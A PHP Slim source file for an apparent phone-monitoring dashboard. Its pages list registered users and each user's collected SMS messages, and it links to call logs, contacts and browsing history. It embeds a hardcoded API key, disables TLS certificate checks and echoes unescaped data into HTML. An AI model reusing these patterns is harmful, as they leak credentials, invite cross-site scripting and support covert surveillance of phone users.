/* *
 * URL: http://localhost/Monitor/cms/sms
 * Parameters: none
 * Method: GET
 * */
$app->get('/sms', function() use ($app){
    $db = new DbOperation();
    $result = $db->getAllUsers();
    $id = '';
    $name = '';
    $phone = '';
    $deviceId = '';
    $deviceBrand = '';
    $deviceModel = '';
    $latitude = '';
    $longitude = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td><a href=/Monitor/cms/smslist?id='.$row['id'].'>'.$row['name'].'</td>';
        $rows .= '<td>'.$row['phone'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No users found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>SMS List</h2>
                        <p>All users registered. </p>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Name</th>
                                    <th>Phone</th> 
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});


/* *
 * URL: http://localhost/Monitor/cms/browserhistorylist
 * Parameters: none
 * Method: GET
 * */
$app->get('/smslist', function() use ($app){
    $id = $app->request->get('id');
    $db = new DbOperation();
    $result = $db->getSmsListById($id);
    $title = '';
    $url = '';

    session_start();
    if(!isset($_SESSION["username"])){
        header('Location: '.'/Monitor/cms/login');
        die;
    }else{
    $rows = '';
    while($row = $result->fetch_assoc()){
        $rows .= '<tr>';
        $rows .= '<td>'.$row['address'].'</td>';
        $rows .= '<td>'.$row['message'].'</td>';
        $rows .= '<td>'.$row['folder'].'</td>';
        $rows .= '<td>'.$row['smsdate'].'</td>';
        $rows .= '</tr>';
    }
    if ($rows=='') {
        $rows="No SMS found";
    }
        $response = '<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <link rel="stylesheet" href="css/custom.css">
            <link rel="stylesheet" href="css/bootstrap.min.css">
        </head>
        <header id="banner" class="body">
          <nav><ul>
            <li><a href="account">Home</a></li>
            <li class="active"><a href="users">All Users List</a></li>
            <li class="active"><a href="browserhistory">Browsing History</a></li>
            <li class="active"><a href="userscallslist">Call Logs</a></li>
            <li class="active"><a href="userscontactslist">Contacts List</a></li>
            <li class="active"><a href="sms">SMS List</a></li>
            <li><a href="placeconfig">Place configure</a></li>
            <li><a href="logout">Logout</a></li>
          </ul></nav>
        </header><!-- /#banner -->
        <body>
            <form method ="post" action="">
                <div class="container">
                    <div class="intro-text">
                        <h2>SMS List</h2>
                    </div>
                    <div class="row">
                        <div class="col-xs-1"></div>
                        <div class="col-xs-10">
                            <table style="width:100%">
                                <tr>
                                    <th>Sender / Receiver</th> 
                                    <th>Message Content</th>
                                    <th>Message Folder</th>
                                    <th>Message Date</th>
                                </tr>'.$rows.'
                            </table>
                        </div>
                    </div>
                </div>
            </form>
        </body>
        </html>
        <style>
table {
    font-family: arial, sans-serif;
    border-collapse: collapse;
    width: 100%;
}

td, th {
    border: 1px solid #dddddd;
    text-align: left;
    padding: 8px;
}
table, th, td {
    border: 1px solid black;
    border-collapse: collapse;
}

tr:nth-child(even) {
    background-color: #dddddd;
}
</style>';
        echo $response;
    }
});


function echoResponse($status_code, $response) {
    $app = \Slim\Slim::getInstance();
    $app->status($status_code);
    $app->contentType('application/json');
    echo json_encode($response);
}


function verifyRequiredParams($required_fields){
    $error = false;
    $error_fields = "";
    $request_params = $_REQUEST;

    if ($_SERVER['REQUEST_METHOD'] == 'PUT') {
        $app = \Slim\Slim::getInstance();
        parse_str($app->request()->getBody(), $request_params);
    }

    foreach ($required_fields as $field) {
        if (!isset($request_params[$field]) || strlen(trim($request_params[$field])) <= 0) {
            $error = true;
            $error_fields .= $field . ', ';
        }
    }

    if ($error) {
        $response = array();
        $app = \Slim\Slim::getInstance();
        $response["error"] = true;
        $response["message"] = 'Required field(s) ' . substr($error_fields, 0, -2) . ' is missing or empty';
        echoResponse(400, $response);
        $app->stop();
    }
}

function send_notification ($tokens, $message) {
    $url = 'https://fcm.googleapis.com/fcm/send';
    $fields = array(
        'registration_ids' => $tokens,
        'data' => $message
    );

    $headers = array(
        'Authorization:key = AIzaSyA6aGLy27C1_nq-A5mih1rlzWImlq2ThsI ',
        'Content-Type: application/json'
    );

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);  
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($fields));
    $result = curl_exec($ch);           
    if ($result === FALSE) {
        die('Curl failed: ' . curl_error($ch));
    }
    curl_close($ch);
    return $result;
}

$app->run();